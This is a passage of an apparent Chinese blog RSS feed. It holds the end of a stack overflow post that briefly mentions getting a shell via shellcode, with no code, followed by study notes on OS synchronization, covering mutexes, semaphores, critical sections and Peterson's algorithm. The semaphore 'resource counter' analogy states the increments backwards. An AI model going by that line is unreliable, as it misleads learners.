&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;abcdef
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;abcdef
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;f
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;可以看到输入的字符成功覆盖了字符串的后一个字节。即可以利用栈溢出篡改内存中的字节，这是栈溢出攻击的基本原理。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;利用栈溢出的攻击方式拿shell&#34;&gt;利用栈溢出的攻击方式————拿shell
&lt;/h3&gt;&lt;p&gt;即通过栈溢出注入shellcode来获取目标程序的shell，得到shell后就可以劫持数据流&lt;/p&gt;
</description>
        </item>
        <item>
        <title></title>
        <link>https://example.com/p/</link>
        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
        
        <guid>https://example.com/p/</guid>
        <description>&lt;h1 id=&#34;同步工具&#34;&gt;同步工具
&lt;/h1&gt;&lt;h2 id=&#34;同步工具概述&#34;&gt;同步工具概述
&lt;/h2&gt;&lt;h3 id=&#34;定义&#34;&gt;定义
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;同步工具是操作系统提供的机制，用于协调并发进程/线程对共享资源的访问，确保数据一致性和程序正确性&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;核心目标&#34;&gt;核心目标
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;互斥：确保临界区间同时只有一个进程访问&lt;/li&gt;
&lt;li&gt;同步：控制进程间的执行顺序&lt;/li&gt;
&lt;li&gt;痛惜：进程间安全地交换信息&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;作用&#34;&gt;作用
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;保证数据一致性
&lt;ul&gt;
&lt;li&gt;避免线程并发运行导致的数据错误。&lt;/li&gt;
&lt;li&gt;可以想象成银行。假设A和B同时登录一个有1000元存款的银行账户，A取出500元，B取出400元。但由于并发执行，B查看账户时的余额仍然是1000元，并且取钱后会将600元写入余额，导致错误。&lt;/li&gt;
&lt;li&gt;所以需要通过并发锁等方式，在A访问账户时阻塞B对账户的访问&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;控制访问顺序
&lt;ul&gt;
&lt;li&gt;确保每个环节在正确的时机开始&lt;/li&gt;
&lt;li&gt;可以想象成厨房。假设没有控制访问，会出现在菜还没做完时，服务员就上菜的现象。需要控制在炒菜完成后，才开始上菜线程。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;协调资源分配
&lt;ul&gt;
&lt;li&gt;确保正确分配资源&lt;/li&gt;
&lt;li&gt;可以想象成停车场，如果没有调度，会发生有车试图停在已经被占用的车位，而空车位没有车去停泊&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;主要同步工具类型&#34;&gt;主要同步工具类型
&lt;/h3&gt;&lt;h4 id=&#34;互斥锁mutex&#34;&gt;互斥锁(Mutex)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;基本概念
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 基本操作
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;mutex_lock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mutex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// 获取锁（原子操作）
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 临界区代码
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;mutex_unlock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mutex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// 释放锁（原子操作）
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;工作机制
&lt;ul&gt;
&lt;li&gt;加锁：如果锁可用则获取，否则阻塞等待&lt;/li&gt;
&lt;li&gt;解锁：释放锁并唤醒等待的进程&lt;/li&gt;
&lt;li&gt;原子性：加锁和解锁操作不可被中断&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;使用场景：上面提及的银行账户问题&lt;/li&gt;
&lt;li&gt;高级特性：
&lt;ul&gt;
&lt;li&gt;递归锁：同一线程可多次获取&lt;/li&gt;
&lt;li&gt;优先级继承：防止优先级反转&lt;/li&gt;
&lt;li&gt;超时机制：避免无限期等待&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;信号量semaphore&#34;&gt;信号量(Semaphore)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;一种用于进程/线程同步的抽象数据结构&lt;/li&gt;
&lt;li&gt;核心思想：由一个整数来表示可用资源的数量，通过原子操作来控制对这些资源的访问&lt;/li&gt;
&lt;li&gt;就像一个“资源计数器”
&lt;ul&gt;
&lt;li&gt;记录还有多少资源可以使用&lt;/li&gt;
&lt;li&gt;当有人要用资源时，计数器+1&lt;/li&gt;
&lt;li&gt;当有人释放资源时，计数器-1&lt;/li&gt;
&lt;li&gt;当计数器为0时，后来的人必须等待&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;基本概念
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;sem_wait&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;semaphore&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;// P操作：信号量-1，如果&amp;lt;0则阻塞
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// 临界区或资源使用
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;sem_post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;semaphore&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;// V操作：信号量+1，唤醒等待进程
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;类型分类
&lt;ul&gt;
&lt;li&gt;计数信号量（用于泊车问题）&lt;/li&gt;
&lt;li&gt;二进制信号量（类似互斥锁）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;经典问题：生产者-消费者问题&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;条件变量condition-variable&#34;&gt;条件变量(Condition Variable)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;基本概念：条件变量用于在某个条件满足之前让线程等待，通常与互斥锁配合使用。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;读写锁read-writer-lock&#34;&gt;读写锁(Read-Writer Lock)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;基本概念：允许多个读者同时访问，但写者需要独占访问。&lt;/li&gt;
&lt;li&gt;使用场景
&lt;ul&gt;
&lt;li&gt;数据库系统&lt;/li&gt;
&lt;li&gt;缓存系统&lt;/li&gt;
&lt;li&gt;文件系统&lt;/li&gt;
&lt;li&gt;读多写少的场景&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;屏障barrier&#34;&gt;屏障(Barrier)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;基本概念：让多个线程在某个点等待，直到所有线程都到达该点才继续执行。、&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;自旋锁spin-lock&#34;&gt;自旋锁(Spin Lock)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;基本概念：不会让线程睡眠，而是持续检查锁状态&lt;/li&gt;
&lt;li&gt;使用场景：
&lt;ul&gt;
&lt;li&gt;临界区很短&lt;/li&gt;
&lt;li&gt;多处理器系统&lt;/li&gt;
&lt;li&gt;内核级同步&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;注生产者-消费者问题&#34;&gt;注：生产者-消费者问题
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;问题定义：生产者-消费者问题描述了两类线程之间的协作关系
&lt;ul&gt;
&lt;li&gt;生产者：生成数据并放入缓冲区&lt;/li&gt;
&lt;li&gt;消费者：从缓冲区取出数据并处理&lt;/li&gt;
&lt;li&gt;缓冲区：存储数据的共享区域，容量有限&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;核心约束条件
&lt;ul&gt;
&lt;li&gt;缓冲区满时：生产者必须等待，不能再生产&lt;/li&gt;
&lt;li&gt;缓冲区空时：消费者必须等待，不能再消费&lt;/li&gt;
&lt;li&gt;互斥访问：生产者和消费者不能同时访问缓冲区&lt;/li&gt;
&lt;li&gt;同步关系：生产者生产的数据要能被消费者及时消费&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;竞态条件&#34;&gt;竞态条件
&lt;/h2&gt;&lt;h3 id=&#34;定义-1&#34;&gt;定义
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;当多个进程（或进程）并发地访问和操作同一数据，且执行结果依赖于访问发生地特定顺序时，这种情况被成为竞态条件。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;核心特征&#34;&gt;核心特征
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;多个执行流：至少有两个线程/进程&lt;/li&gt;
&lt;li&gt;共享数据：共享数据&lt;/li&gt;
&lt;li&gt;并发访问：并发访问&lt;/li&gt;
&lt;li&gt;结果不确定：最终结果取决于执行顺序&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;经典案例&#34;&gt;经典案例
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;银行账户问题&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;临界区&#34;&gt;临界区
&lt;/h2&gt;&lt;h3 id=&#34;定义-2&#34;&gt;定义
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;考虑一个由n个进程组成的系统{p&lt;del&gt;0&lt;/del&gt;, p&lt;del&gt;1&lt;/del&gt;, &amp;hellip; p&lt;del&gt;n-1&lt;/del&gt;}，每个进程都有一个临界区代码段，例如改变公共变量、更新表格、写文件等。同时只能有一个进程位于临界区中。当一个进程在临界区中时，其他进程都不能进入它们的临界区。每个进程必须在进去区请求进入临界区的许可。许可应该在退出区被释放。&lt;/li&gt;
&lt;li&gt;即临界区为程序中访问共享资源的代码段。在多进程或多线程环境中，这段代码同一时刻只能被一个执行单元执行，以避免数据竞争和不一致&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;组成&#34;&gt;组成
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;完整的进程结构&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;request_permission&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//进入区，请求进入临界区的许可
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;access_shared_resource&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//临界区，访问和修改共享资源的核心代码
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;release_permission&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//退出区，释放临界区，允许其他进程进入
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;do_other_work&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//剩余区，执行不涉及共享资源的其他操作
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;基本要求&#34;&gt;基本要求
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;互斥性：同时只能由一个进程在临界区内&lt;/li&gt;
&lt;li&gt;进展性：如果临界区空闲且有进程想要进入，那应该能进入&lt;/li&gt;
&lt;li&gt;有界等待：进程等待时间应该是有限的&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;解决方案&#34;&gt;解决方案
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;互斥锁&lt;/li&gt;
&lt;li&gt;信号量&lt;/li&gt;
&lt;li&gt;自旋锁&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;时机应用场景&#34;&gt;时机应用场景
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;操作系统&lt;/li&gt;
&lt;li&gt;数据库管理系统&lt;/li&gt;
&lt;li&gt;Web服务器&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;经典的软件同步算法peterson算法&#34;&gt;经典的软件同步算法————Peterson算法
&lt;/h3&gt;&lt;h4 id=&#34;核心设计思想谦让机制&#34;&gt;核心设计思想————谦让机制
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;每个进程都表达自己想要进入临界区的意愿&lt;/li&gt;
&lt;li&gt;同时主动谦让把优先权交给对方&lt;/li&gt;
&lt;li&gt;实现代码
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 进程Pi (i = 0 或 1)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// j是另一个进程的编号 (j = 1-i)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// === 进入区 ===
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;              &lt;span class=&#34;c1&#34;&gt;// 第1步：举手表示&amp;#34;我想进入临界区&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;turn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;                    &lt;span class=&#34;c1&#34;&gt;// 第2步：谦让，&amp;#34;你先请&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// 第3步：等待检查
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;turn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;// 如果对方也想进入(flag[j]==true) 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;// 且确实轮到对方(turn==j)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;// 那么我就等待
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;// 这里是忙等待
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// === 临界区 ===
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nf&#34;&gt;critical_section&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// === 退出区 ===
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;             &lt;span class=&#34;c1&#34;&gt;// 第4步：表示&amp;#34;我不再需要临界区了&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// === 剩余区 ===
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nf&#34;&gt;remainder_section&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
